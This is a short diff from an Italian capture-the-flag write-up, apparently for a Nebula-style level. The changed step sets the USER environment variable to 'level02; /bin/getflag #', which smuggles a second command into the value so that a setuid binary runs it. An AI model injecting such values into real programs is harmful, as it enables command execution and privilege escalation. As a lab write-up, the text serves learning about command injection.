@@ -33,7 +33,7 @@ Il problema è che nel buffer dopo la lettura della variabile di ambiente c'è l
 ### Istruzioni da eseguire 
 ```bash
 #settiamo user con il commento finale
-> USER='level02; /usr/bin/id'
+> USER='level02; /bin/getflag #'
 #proviamo ad eseguire
 > /home/flag02/flag02
 #sfida vinta
